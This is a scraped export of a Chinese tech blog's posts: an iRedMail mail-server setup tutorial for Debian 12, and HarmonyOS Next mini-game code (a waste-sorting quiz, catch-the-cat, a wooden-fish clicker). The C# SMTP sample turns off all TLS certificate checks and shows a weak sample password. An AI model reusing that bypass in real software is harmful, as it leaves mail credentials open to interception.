TABLES;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"},{"name":"iRedMail","slug":"iRedMail","permalink":"https://banjinmei.github.io/tags/iRedMail/"}],"author":"mu"},{"title":"iRedMail smtp","slug":"iRedMail-smtp","date":"2024-12-19T12:50:57.000Z","updated":"2025-01-08T16:22:51.097Z","comments":true,"path":"2024/12/19/iRedMail-smtp/","permalink":"https://banjinmei.github.io/2024/12/19/iRedMail-smtp/","excerpt":"","text":"iRedMailiRedMail 是一个 shell 脚本，可以在 Linux&#x2F;BSD 服务器上自动安装和配置所有必需的邮件服务器组件，从而消除手动安装和配置。借助 iRedMail，可以在基于 Web 的管理面板中轻松创建无限的邮箱和无限的邮件域。邮箱可以存储在 MariaDB&#x2F;MySQL、PostreSQL 数据库或 OpenLDAP 中。以下是 iRedMail 将自动安装和配置的开源软件的列表。 PostfixSMTP 服务器Dovecot IMAP 服务器Nginx 网络服务器，为管理面板和网络邮件提供服务OpenLDAP、MySQL&#x2F;MariaDB 或 PostgreSQL 用于存储用户信息Amavided-用于 DKIM 签名和验证的新功能SpamAssassin 用于反垃圾邮件ClamAV 用于防病毒Roundcube 网络邮件SOGo组件，提供网络邮件、日历(CalDAV)、联系人(CardDAV)、任务和ActiveSync服务。用于保护 SSH 的 Fail2banmlmmj 邮件列表管理器网络数据服务器监控用于灰名单的 iRedAPD Postfix 策略服务器 1.创建 DNS MX 记录MX 记录指定哪个或哪些主机处理特定域名的电子邮件。例如，处理 linux-terminal.com 电子邮件的主机是 mail.linux-terminal.com。如果拥有 Gmail 帐户的人向 [email 发送电子邮件，则 Gmail 服务器将查询 linux-terminal.com 的 MX 记录。当发现mail.linux-terminal.com负责接收邮件时，它会查询mail.linux-terminal.com的A记录来获取IP地址，从而可以发送电子邮件。 可以登录域名注册商的网站（例如 NameCheap）来创建 DNS 记录。 在 DNS 管理器中，为域名创建 MX 记录。在“名称”字段中输入 @ 以表示主域名，然后在“值”字段中输入 mail.your-domain.com。 注意：MX记录的主机名不能是其他名称的别名。另外，强烈建议使用主机名而不是裸 IP 地址作为 MX 记录。 DNS 管理器可能会要求输入首选项值（也称为优先级值）。它可以是 0 到 65,356 之间的任意数字。小数字比大数字具有更高的优先级。建议将该值设置为0，这样该邮件服务器将具有最高的优先级来接收电子邮件。创建 MX 记录后，还需要为 mail.your-domain.com 创建 A 记录，以便将其解析为 IP 地址。如果服务器使用 IPv6 地址，请务必添加 AAAA 记录。 提示：如果使用 Cloudflare DNS 服务，则在为 mail.your-domain.com 创建 A 记录时不应启用 CDN 功能。 Cloudflare 不支持 SMTP 代理。 @ . mail A 记录 到 IP mail MX 记录到 mail.your-domain.com 2.配置主机名通过 SSH 登录服务器，然后运行以下命令来更新现有软件包。 12sudo apt update;sudo apt upgrade; 建议创建一个 sudo 用户来管理服务器，而不是使用默认的 root 用户。运行以下命令创建用户。将 username 替换为首选的用户名。 1adduser username 然后将用户添加到 sudo 组。 1adduser username sudo 然后切换到新用户。 1su - username 接下来，使用以下命令为服务器设置完全限定域名 (FQDN)。 1sudo hostnamectl set-hostname mail.your-domain.com 们还需要使用 Nano 等命令行文本编辑器更新 &#x2F;etc&#x2F;hosts 文件。 1sudo nano /etc/hosts 像下面这样编辑它。 （使用箭头键在文件中移动光标。） 1127.0.0.1 mail.your-domain.com localhost 保存并关闭文件。 （要在 Nano 文本编辑器中保存文件，请按 Ctrl+O，然后按 Enter 确认。要关闭文件，请按 Ctrl+X &gt;.) 要查看更改，请注销并重新登录，然后运行以下命令以查看主机名。 1hostname -f 3.使用 iRedMail 在 Debian 12 上设置邮件服务器运行以下命令从其 Github 存储库下载最新版本的 iRedMail 脚本安装程序。 1wget https://github.com/iredmail/iRedMail/archive/1.6.4.tar.gz 提取存档文件。 1tar xvf 1.6.4.tar.gz 然后 cd 进入新创建的目录。 1cd iRedMail-1.6.4/ 为iRedMail.sh脚本添加可执行权限。 1chmod +x iRedMail.sh 接下来，使用 sudo 权限运行 Bash 脚本。 1sudo bash iRedMail.sh 将出现邮件服务器设置向导。使用 Tab 键选择 YES，然后按 Enter。Welcome and thanks for your use 下一个屏幕将要求选择邮件存储路径。可以使用默认的 &#x2F;var&#x2F;vmail，只需按 Enter 键即可。sub-directory:&#x2F;var&#x2F;vmail&#x2F;backup 然后选择是否要运行 Web 服务器。强烈建议选择运行 Web 服务器，因为需要基于 Web 的管理面板来添加电子邮件帐户。它还允许访问 Roundcube 网络邮件。默认情况下，选择 Nginx Web 服务器，因此只需按 Enter 键即可。 （星号表示该项目已被选中。）Nginx The fastest web server 然后选择电子邮件帐户的存储后端。选择熟悉的一个。选择MariaDB。按上下方向键并按空格键进行选择。select item. 如果选择了 MariaDB 或 MySQL，那么将需要设置 MySQL root 密码。 123123.zroot on server 接下来，输入第一个邮件域。可以稍后在基于 Web 的管理面板中添加其他邮件域。本教程假设需要一个电子邮件帐户，例如[受保护的电子邮件]。在这种情况下，需要在此处输入 your-domain.com，不带子域。不要在域名后面按空格键。认为 iRedMail 会将空格字符与域名一起复制，这可能会导致安装失败。Postfix won’t accept anyemail sent to this mail domain. 接下来，设置邮件域管理员的密码。iRedAdmin with this account. 选择可选组件。默认情况下，选择 4 个项目。如果喜欢 SOGo 组件，请选择它并按 Enter。 Review your settings现在可以检查配置。输入 Y 开始安装所有邮件服务器组件。 安装结束时，选择Y 使用iRedMail提供的防火墙规则并重新启动防火墙。 Y 至此iRedMail安装完成。将收到网络邮件、SOGo 组件和网络管理面板的 URL 以及登录凭据的通知。 iRedMail.tips 文件包含有关 iRedMail 服务器的重要信息。URLs of installed web applications: reboot 重启https://mail.your-domain.com/iredadmin/ 访问管理面板登录后 最后边添加-&gt;用户 输入信息即可添加用户 https://mail.your-domain.com/ 用户登录面板 代码调用smtp发送示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960using System.Net.Mail;using System.Net;using System.Security.Cryptography.X509Certificates;using System.Net.Security;namespace ConsoleApp1Mail&#123; internal class Program &#123; static void Main(string[] args) &#123; string smtpServer = &quot;mail.myimmail.workxx&quot;; int smtpPort = 587; string smtpUser = &quot;postmaster@myimmail.workxx&quot;; string smtpPassword = &quot;xxx&quot;; string recipientEmail = &quot;reemail&quot;; // 忽略证书验证 ServicePointManager.ServerCertificateValidationCallback = delegate ( object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) &#123; return true; // 忽略所有证书错误 &#125;; SendVerificationEmail(smtpServer, smtpPort, smtpUser, smtpPassword, recipientEmail); &#125; static void SendVerificationEmail(string smtpServer, int smtpPort, string smtpUser, string smtpPassword, string recipientEmail) &#123; string subject = &quot;Email Verification&quot;; string body = &quot;This is your verification code: 123456&quot;; try &#123; using (SmtpClient client = new SmtpClient(smtpServer, smtpPort)) &#123; client.Credentials = new NetworkCredential(smtpUser, smtpPassword); client.EnableSsl = true; // 启用 SSL MailMessage message = new MailMessage &#123; From = new MailAddress(smtpUser), Subject = subject, Body = body &#125;; message.To.Add(recipientEmail); client.Send(message); Console.WriteLine(&quot;Email sent successfully!&quot;); &#125; &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error: &#123;ex.Message&#125;&quot;); &#125; &#125; &#125;&#125; 安装完ired需要重启~","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"iRedMail","slug":"iRedMail","permalink":"https://banjinmei.github.io/tags/iRedMail/"},{"name":"smtp","slug":"smtp","permalink":"https://banjinmei.github.io/tags/smtp/"}],"author":"mu"},{"title":"HarmonryOS Next Waste Sorting","slug":"HarmonryOS-Next-waste-sorting","date":"2024-12-15T07:33:54.000Z","updated":"2024-12-15T08:58:35.275Z","comments":true,"path":"2024/12/15/HarmonryOS-Next-waste-sorting/","permalink":"https://banjinmei.github.io/2024/12/15/HarmonryOS-Next-waste-sorting/","excerpt":"","text":"环境DevEco Studio NEXT Beta1 Build Version: 5.0API 13 Waste Sorting垃圾分类 算法123456//springCurve回弹animateToImmediately(&#123; duration:800, curve: curves.springCurve(0, 20, 90, 20), // 其他配置&#125;); 初始偏移量、振幅、周期和阻尼系数，通过这些参数可以控制动画的弹性效果 123456789//Fisher-Yates洗牌shuffleItems() &#123; for (let i = this.garbageItems.length - 1; i &gt; 0; i--) &#123; const j = Math.floor(Math.random() * (i + 1)); let temp = this.garbageItems[i]; this.garbageItems[i] = this.garbageItems[j]; this.garbageItems[j] = temp; &#125;&#125; 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315import &#123; curves &#125; from &#x27;@kit.ArkUI&#x27;; // 导入ArkUI工具包中的曲线模块// 定义垃圾项目类class GarbageItem &#123; name: string; // 垃圾名称 type: number; // 垃圾类型 description?: string; // 垃圾描述，可选 // 构造函数初始化垃圾项目 constructor(name: string, type: number, description?: string) &#123; this.name = name; // 设置垃圾名称 this.type = type; // 设置垃圾类型 this.description = description || &quot;&quot;; // 设置垃圾描述，默认为空字符串 &#125;&#125;// 定义垃圾类别类class GarbageCategory &#123; name: string; // 类别名称 type: number; // 类别类型 color: string; // 类别颜色 description: string; // 类别描述 // 构造函数初始化垃圾类别 constructor(name: string, type: number, color: string, description: string) &#123; this.name = name; // 设置类别名称 this.type = type; // 设置类别类型 this.color = color; // 设置类别颜色 this.description = description; // 设置类别描述 &#125;&#125;// 使用组件装饰器定义一个名为Index的应用入口@Entry@Componentstruct Index &#123; // 定义状态变量 @State currentQuestionIndex: number = 0; // 当前题目索引 @State quizResults: string[] = []; // 测验结果数组 @State totalScore: number = 0; // 总得分 @State showAnimation: boolean = false; // 是否显示动画 @State scaleOptions: ScaleOptions = &#123; x: 1, y: 1 &#125;; // 缩放选项 @State itemXPosition: number = 0; // 物品X轴位置 @State itemOpacity: number = 1.0; // 物品透明度 // 初始化垃圾类别数组 @State garbageCategories: GarbageCategory[] = [ new GarbageCategory(&quot;有害垃圾&quot;, 0, &quot;#e2413f&quot;, &quot;对人体健康或自然环境可能造成直接或潜在危害的生活垃圾&quot;), // 创建有害垃圾类别 new GarbageCategory(&quot;可回收物&quot;, 1, &quot;#1c6bb5&quot;, &quot;适宜回收和资源利用的物品&quot;), // 创建可回收物类别 new GarbageCategory(&quot;厨余垃圾&quot;, 2, &quot;#4ca84e&quot;, &quot;上海称湿垃圾，易腐烂的、含有机质的生活垃圾&quot;), // 创建厨余垃圾类别 new GarbageCategory(&quot;其他垃圾&quot;, 3, &quot;#5f5f5f&quot;, &quot;上海称干垃圾，不能归类于以上三类的生活垃圾&quot;), // 创建其他垃圾类别 ]; @State garbageItems: GarbageItem[] = [ new GarbageItem(&quot;菜帮菜叶&quot;, 2), new GarbageItem(&quot;剩菜剩饭&quot;, 2), new GarbageItem(&quot;过期食品&quot;, 2), new GarbageItem(&quot;瓜果皮壳&quot;, 2), new GarbageItem(&quot;鱼骨鱼刺&quot;, 2), new GarbageItem(&quot;鸡蛋及蛋壳&quot;, 2), new GarbageItem(&quot;残枝落叶&quot;, 2), new GarbageItem(&quot;茶叶渣&quot;, 2), new GarbageItem(&quot;酒瓶&quot;, 1,), new GarbageItem(&quot;玻璃杯&quot;, 1), new GarbageItem(&quot;调味瓶&quot;, 1), new GarbageItem(&quot;图书&quot;, 1), new GarbageItem(&quot;打印纸&quot;, 1), new GarbageItem(&quot;信封&quot;, 1), new GarbageItem(&quot;易拉罐&quot;, 1), new GarbageItem(&quot;金属刀具&quot;, 1), new GarbageItem(&quot;奶粉桶&quot;, 1), new GarbageItem(&quot;衣服裤子&quot;, 1), new GarbageItem(&quot;毛绒玩具&quot;, 1), new GarbageItem(&quot;鞋&quot;, 1), new GarbageItem(&quot;饮料瓶&quot;, 1), new GarbageItem(&quot;塑料盆&quot;, 1), new GarbageItem(&quot;食用油桶&quot;, 1), new GarbageItem(&quot;洗衣机&quot;, 1), new GarbageItem(&quot;电烤箱&quot;, 1), new GarbageItem(&quot;电视机&quot;, 1), new GarbageItem(&quot;充电电池&quot;, 0), new GarbageItem(&quot;废含汞荧光灯管&quot;, 0), new GarbageItem(&quot;过期药品及其包装物&quot;, 0), new GarbageItem(&quot;油漆桶&quot;, 0), new GarbageItem(&quot;血压计&quot;, 0), new GarbageItem(&quot;废水银温度计&quot;, 0), new GarbageItem(&quot;杀虫喷雾罐&quot;, 0), new GarbageItem(&quot;废X光片等感光胶片&quot;, 0), new GarbageItem(&quot;食品袋&quot;, 3), new GarbageItem(&quot;大棒骨&quot;, 3), new GarbageItem(&quot;创可贴&quot;, 3), new GarbageItem(&quot;污损塑料袋&quot;, 3), new GarbageItem(&quot;烟屁&quot;, 3), new GarbageItem(&quot;陶瓷碎片&quot;, 3), new GarbageItem(&quot;餐巾纸&quot;, 3, &quot;厕纸、卫生纸遇水即溶，不算可回收的“纸张”，类似的还有烟盒等。&quot;), new GarbageItem(&quot;卫生纸&quot;, 3, &quot;厕纸、卫生纸遇水即溶，不算可回收的“纸张”，类似的还有烟盒等。&quot;), ]; // 在组件即将出现时重置测验 aboutToAppear(): void &#123; this.resetQuiz(); // 调用重置测验方法 &#125; // 重置测验状态 resetQuiz() &#123; this.quizResults = []; // 清空测验结果 this.totalScore = 0; // 清零总得分 this.currentQuestionIndex = 0; // 重置当前题目索引 this.shuffleItems(); // 打乱垃圾项目顺序 &#125; // 打乱垃圾项目顺序 shuffleItems() &#123; for (let i = this.garbageItems.length - 1; i &gt; 0; i--) &#123; const j = Math.floor(Math.random() * (i + 1)); // 随机索引 let temp = this.garbageItems[i]; // 临时存储 this.garbageItems[i] = this.garbageItems[j]; // 交换位置 this.garbageItems[j] = temp; // 交换位置 &#125; &#125; // 检查用户选择的答案 checkAnswer(categoryType: number) &#123; const currentItem = this.garbageItems[this.currentQuestionIndex]; // 获取当前垃圾项目 this.quizResults.push(`$&#123;currentItem.name&#125;（$&#123;this.garbageCategories[categoryType].name&#125;）【$&#123;currentItem.type === categoryType ? &quot;✔&quot; : this.garbageCategories[currentItem.type].name&#125;】`); // 添加到测验结果中 if (currentItem.type === categoryType) &#123; // 如果答案正确 this.totalScore += 10; // 加十分 &#125; this.currentQuestionIndex++; // 进入下一个题目 if (this.currentQuestionIndex &gt;= 10) &#123; // 如果完成了十个题目 this.displayResults(); // 显示结果 this.resetQuiz(); // 重置测验 &#125; &#125; // 显示测验结果 displayResults() &#123; let sheets: SheetInfo[] = []; // 初始化结果页面列表 for (let i = 0; i &lt; this.quizResults.length; i++) &#123; // 循环添加每一个结果 sheets.push(&#123; title: this.quizResults[i], // 设置标题为测验结果 action: () =&gt; &#123; // 不执行任何操作 &#125; &#125;); &#125; this.getUIContext().showActionSheet(&#123; // 显示结果页 title: &#x27;成绩单&#x27;, // 标题 message: `总分数:$&#123;this.totalScore&#125;`, // 分数信息 confirm: &#123; // 确认按钮 defaultFocus: true, // 默认焦点 value: &#x27;我知道了&#x27;, // 按钮文本 action: () =&gt; &#123; // 点击后的动作 &#125; &#125;, onWillDismiss: () =&gt; &#123; // 关闭前的动作 &#125;, alignment: DialogAlignment.Center, // 对齐方式为中心 sheets: sheets // 结果页面列表 &#125;); &#125; // 构建用户界面 build() &#123; Column() &#123; // 创建列布局 Text(`垃圾分类测验:$&#123;this.currentQuestionIndex + 1&#125;/10`) // 显示当前题目序号 .fontSize(&#x27;30lpx&#x27;) // 设置字体大小 .margin(20); // 设置外边距 Stack() &#123; // 创建堆栈布局 Text(`$&#123;this.garbageItems[this.currentQuestionIndex].name&#125;`) // 显示当前垃圾项目名称 .textAlign(TextAlign.Center) // 居中对齐 .width(&#x27;130lpx&#x27;) // 设置宽度 .height(&#x27;130lpx&#x27;) // 设置高度 .border(&#123; width: 1 &#125;) // 设置边框宽度 .borderRadius(5) // 设置圆角半径 .fontColor(Color.White) // 设置字体颜色 .backgroundColor(Color.Orange) // 设置背景颜色 .fontSize(&#x27;20lpx&#x27;) // 设置字体大小 .padding(2) // 设置内边距 .scale(this.scaleOptions); // 设置缩放比例 if (this.showAnimation) &#123; // 如果显示动画 Particle(&#123; // 创建粒子效果 particles: [ // 初始化粒子数组 &#123; emitter: &#123; // 粒子发射器配置 particle: &#123; // 粒子类型配置 type: ParticleType.POINT, // 粒子类型为点 config: &#123; // 配置 radius: 5 // 点的半径 &#125;, count: 50, // 粒子数量 lifetime: -1, // 生命周期 lifetimeRange: -1 // 生命周期范围 &#125;, emitRate: 100, // 发射速率 position: [&#x27;25%&#x27;, 0], // 发射位置 size: [&#x27;100lpx&#x27;, &#x27;100lpx&#x27;], // 发射器大小 shape: ParticleEmitterShape.RECTANGLE // 发射器形状为矩形 &#125;, color: &#123; // 粒子颜色配置 range: [Color.Orange, Color.Orange], // 颜色范围 updater: &#123; // 更新器配置 type: ParticleUpdater.CURVE, // 变化方式为曲线变化 config: [ // 配置项 &#123; from: Color.Orange, // 起始颜色 to: Color.Orange, // 终止颜色 startMillis: 0, // 开始时间 endMillis: -1, // 结束时间 curve: Curve.FastOutLinearIn // 曲线类型 &#125; ] &#125; &#125;, scale: &#123; // 粒子大小配置 range: [0.8, 1.2], // 大小范围 updater: &#123; // 更新器配置 type: ParticleUpdater.CURVE, // 变化方式为曲线变化 config: [ // 配置项 &#123; from: 1.0, // 起始大小 to: 1.0, // 终止大小 startMillis: 0, // 开始时间 endMillis: -1, // 结束时间 curve: Curve.EaseIn &#125; ] &#125; &#125;, // 粒子加速度配置 acceleration: &#123; speed: &#123; range: [8000, 10000], // 向下减速，模拟重力 updater: &#123; type: ParticleUpdater.RANDOM, // 加速度线性变化 config: [400, 500] &#125; &#125;, angle: &#123; range: [90, 90] // 方向固定向下 &#125; &#125;, &#125; ] &#125;).width(&quot;100%&quot;).height(&quot;100%&quot;); &#125; &#125; .width(&#x27;150lpx&#x27;) .height(&#x27;300lpx&#x27;) .align(Alignment.Top) .translate(&#123;x:`$&#123;this.itemXPosition&#125;lpx`,y:0&#125;); Row() &#123; ForEach(this.garbageCategories, (category: GarbageCategory) =&gt; &#123; Column() &#123; Text(category.name) .fontColor(Color.White) .fontSize(&#x27;30lpx&#x27;) .padding(5); Divider(); Text(category.description) .fontColor(Color.White) .fontSize(&#x27;28lpx&#x27;) .padding(5); &#125; .backgroundColor(category.color) .height(&#x27;280lpx&#x27;) .width(&quot;24%&quot;) .border(&#123; width: 1 &#125;) .borderRadius(5) .margin(&#123; left: 1, right: 1 &#125;) .clickEffect(&#123; scale: 0.8, level: ClickEffectLevel.MIDDLE &#125;) .onClick(() =&gt; &#123; if(this.showAnimation)&#123; return &#125; this.showAnimation = true let itemX:number = 0 if(category.type==0)&#123; itemX = -270 &#125;else if(category.type==1)&#123; itemX = -90 &#125;else if(category.type==2)&#123; itemX = 90 &#125;else if(category.type==3)&#123; itemX = 270 &#125; animateToImmediately(&#123; duration:200, onFinish:()=&gt;&#123; animateToImmediately(&#123; duration:800, curve: curves.springCurve(0, 20, 90, 20), onFinish:()=&gt;&#123; animateToImmediately(&#123; duration:200, onFinish:()=&gt;&#123; this.itemXPosition = 0 this.checkAnswer(category.type); this.showAnimation = false &#125; &#125;,()=&gt;&#123; this.itemXPosition = 0 this.scaleOptions = &#123; x: 1.0, y: 1.0 &#125;; &#125;) &#125; &#125;,()=&gt;&#123; this.scaleOptions = &#123; x: 1.3, y: 1.3 &#125;; &#125;) &#125; &#125;,()=&gt;&#123; this.itemXPosition = itemX &#125;) &#125;); &#125;); &#125; Button(&#x27;重新开始&#x27;).clickEffect(&#123; level: ClickEffectLevel.LIGHT &#125;).margin(&#123; top: 50 &#125;).onClick(() =&gt; &#123; this.resetQuiz() &#125;); &#125;.width(&#x27;100%&#x27;); &#125;&#125; catch cat围住神经猫 算法1. 广度优先搜索（BFS）：广度优先搜索（Breadth-First Search，简称 BFS）是一种用于图和树结构的遍历或搜索算法。它从一个起始节点开始，首先访问该节点的所有邻接节点，然后再以同样的方式逐层访问这些邻接节点的邻接节点，直到访问完整个图或者找到目标节点为止。BFS的特点是按照从近到远的顺序访问节点，因此它非常适合用来寻找最短路径问题，尤其是在所有边的权重相等的情况下。 BFS的基本步骤如下：初始化：选择一个起始节点，将其放入队列，并标记为已访问。循环处理：从队列中取出第一个节点。检查该节点是否为目标节点；如果是，则结束搜索。否则，将该节点的所有未访问过的邻接节点加入队列，并标记为已访问。终止条件：当队列为空时，表示所有可到达的节点都已经被访问过，如果此时还没有找到目标节点，则说明目标节点不可达。 在 findNeighbors 方法中，通过遍历当前单元格的邻居来获取周围非墙壁且可以移动的单元格集合。这类似于广度优先搜索的思想，逐层遍历邻居单元格。 123456findNeighbors(cell: Cell): Cell[] &#123; let neighbors: Cell[] = []; // 检查当前单元格的六个方向邻居，将非墙壁且可以移动的单元格加入集合 // ... return neighbors;&#125; 2. 启发式搜索：在 selectNextMove 方法中，根据一定的启发式函数选择下一个移动位置，以确保小猫朝着离边界最近的方向移动。这种启发式搜索可以帮助小猫更智能地选择下一步的移动位置。 12345selectNextMove(emptyNeighbors: Cell[]): Cell &#123; // 根据启发式函数选择最优的移动位置 // ... return closestToEdge || emptyNeighbors[0];&#125; 3. 曼哈顿距离计算：曼哈顿距离（Manhattan Distance），也称为城市街区距离（City Block distance）或出租车几何，是衡量在标准坐标系中两个点之间沿轴向距离的总和。简单来说，它是从一个点到另一个点，在只允许水平或垂直移动的情况下，必须经过的最小距离。这个概念得名于美国纽约市曼哈顿区的街道布局，因为那里的街道大多呈网格状分布，车辆只能沿着这些街道行驶，而不能斜穿。 在 computeHeuristic 方法中，使用曼哈顿距离计算启发式函数的值，以评估当前单元格到边界的距离。曼哈顿距离是在网格上两点之间的距离，沿着网格的边缘移动。 12345computeHeuristic(cell: Cell): number &#123; // 计算曼哈顿距离作为启发式函数的值 // ... return minDistanceX + minDistanceY;&#125; wood fish电子木鱼 animateToImmediately 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// 观察者模式装饰器@ObservedV2class Cell &#123; value: string = &#x27;功德+1&#x27;; // 默认显示的文字 @Trace // 跟踪属性变化 opacity: number = 0; // 文字透明度 @Trace // 跟踪属性变化 y: number = 0; // 文字的垂直偏移量&#125; // 主入口组件@Entry@Componentstruct Index &#123; @State list: Cell[] = []; // 存储所有 Cell 对象的数组 indexCount: number = 0; // 记录当前滚动的索引 count: number = 10; // 列表中 Cell 对象的数量 image: string = &#x27;data:image/png;base64,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